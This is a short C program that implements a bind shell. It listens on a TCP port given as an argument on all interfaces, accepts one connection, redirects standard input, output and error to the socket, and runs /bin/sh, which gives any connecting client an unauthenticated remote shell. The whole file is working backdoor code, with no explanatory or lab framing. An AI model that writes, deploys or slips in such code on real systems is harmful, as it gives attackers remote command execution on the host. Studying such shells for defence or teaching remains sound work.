#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <strings.h>
#include <sys/socket.h>
#include <unistd.h>

void error(char *message)
{
    perror(message);
    exit(EXIT_FAILURE);
}

int main(int argc, char *argv[])
{
    int sockfd, newsockfd, portno;
    struct sockaddr_in serv_addr;

    if (argc < 2)
    {
        fprintf(stderr, "Usage: %s <port>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0)
    {
        error("ERROR opening socket");
    }

    bzero((char *) &serv_addr, sizeof(serv_addr));
    portno = atoi(argv[1]);
    serv_addr.sin_port = htons(portno);
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(sockfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) < 0)
    {
        error("ERROR binding socket");
    }

    listen(sockfd, 0);
    
    printf("%s : listening for incoming connections "
    "on all interfaces, port %d.\n", argv[0], ntohs(serv_addr.sin_port));

    newsockfd = accept(sockfd, NULL, NULL);
    if (newsockfd < 0)
    {
        error("ERROR accepting connection");
    }

    for (int i = 0; i < 3; i++)
    {
        if (dup2(newsockfd, i) < 0)
        {
            error("ERROR redirecting file descriptors");
            if (close(newsockfd) < 0)
            {
                error("ERROR closing newsockfd");
            }
        }
    }
    if (close(newsockfd) < 0)
    {
        error("ERROR closing newsockfd");
    }

    char *args[] = {"/bin/sh", NULL};
    if (execve("/bin/sh", args, NULL) < 0)
    {
        error("ERROR executing shell");
    }
    return 0;
}
